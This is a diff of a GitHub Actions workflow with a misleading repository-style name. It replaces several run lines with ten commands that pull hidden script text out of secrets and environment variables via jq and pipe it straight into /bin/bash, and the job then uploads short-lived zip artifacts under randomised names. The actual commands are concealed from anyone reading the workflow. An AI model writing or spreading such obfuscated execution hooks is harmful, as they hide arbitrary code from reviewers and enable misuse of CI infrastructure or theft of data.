@@ -1,8 +1,7 @@
 name: rachelsklearnp930
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '28 3,9,15,21 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +9,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: rachelsklearnp930
         env:
-          hgl3: ${{ secrets.hgl3 }}
+          e87: ${{ secrets.e87 }}
         run: |
-          printf '%s' "$hgl3" | jq -r .vlh584 | /bin/bash
-          printf '%s' "$d4899" | jq -r .rrtx5715 | /bin/bash
-          echo $pk68 | jq -r .bmj95 | /bin/bash
-          printf '%s' "$ld13" | jq -r .t308 | /bin/bash
-          echo $htry6 | jq -r .ukg1 | /bin/bash
-          echo $pjz8 | jq -r .joctt0677 | /bin/bash
-          printf '%s' "$mpno99005" | jq -r .o12622 | /bin/bash
+          printf '%s' "$e87" | jq -r .ees16199 | /bin/bash
+          printf '%s' "$ldwcq384" | jq -r .trzg2450 | /bin/bash
+          printf '%s' "$jym60371" | jq -r .i534 | /bin/bash
+          printf '%s' "$f60" | jq -r .zcmm3018 | /bin/bash
+          printf '%s' "$yvwgb99" | jq -r .xm9 | /bin/bash
+          echo $mzx97577 | jq -r .u68 | /bin/bash
+          printf '%s' "$zbmbk59735" | jq -r .pmj65201 | /bin/bash
+          echo $gjwzu719 | jq -r .oqsl3365 | /bin/bash
+          echo $udwb5 | jq -r .xhuh89525 | /bin/bash
+          printf '%s' "$drpph96" | jq -r .mvw0 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: sYzLLtMG
+          name: R8YgCXD8
           path: "*.zip"
           retention-days: 1
